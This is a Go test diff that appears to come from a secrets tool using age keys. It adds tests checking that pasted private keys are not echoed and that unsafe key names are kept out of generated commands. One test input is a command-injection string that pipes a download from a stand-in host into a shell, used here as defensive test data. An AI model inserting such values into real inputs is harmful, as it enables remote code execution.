@@ -214,6 +214,29 @@ func TestRecipientGuardsMirrorCLI(t *testing.T) {
 	}
 }
 
+func TestPastedPrivateKeyNotEchoed(t *testing.T) {
+	u := newUI(t)
+	u.useFixture()
+	u.login()
+	// The request helper fails the test if the value shows up anywhere.
+	page := u.follow("/recipients/add", url.Values{"recipient": {"s3cr3t-test-value"}})
+	wantContains(t, page, "not a valid age public key", "nothing changed")
+	page = u.follow("/recipients/remove", url.Values{"recipient": {"s3cr3t-test-value"}})
+	wantContains(t, page, "not a valid age public key")
+}
+
+func TestRetrieveSkipsUnsafeNames(t *testing.T) {
+	ex := examples(exampleInput{File: "/srv/secrets.env", Names: []string{"X'; curl evil | sh; '", "GOOD_NAME"}})
+	for _, e := range ex {
+		for _, l := range e.Lines {
+			if strings.Contains(l, "curl evil") {
+				t.Fatalf("an unsafe key name reached a command: %s", l)
+			}
+		}
+	}
+	wantContains(t, ex[0].Lines[1], "$GOOD_NAME")
+}
+
 func TestRetrieveExamplesGolden(t *testing.T) {
 	inputs := []exampleInput{
 		{
